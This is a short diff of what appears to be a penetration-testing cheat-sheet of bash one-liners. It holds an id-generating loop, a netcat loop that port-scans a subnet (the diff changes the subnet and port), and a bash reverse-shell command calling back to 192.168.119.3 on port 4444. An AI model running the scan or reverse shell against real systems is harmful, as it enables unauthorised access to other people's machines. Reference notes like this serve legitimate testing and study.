@@ -1,7 +1,7 @@
 
 `for i in $(seq 1 1000); do echo $i >> ids.txt; done` - generates value of id parameter 1-1000
 
-`for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done` - conduct a portscan on a remote host
+`for i in $(seq 1 254); do nc -zv -w 1 10.4.226.$i 80; done` - conduct a portscan on a remote host
 
 `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` - utilize to get a reverse shell
 
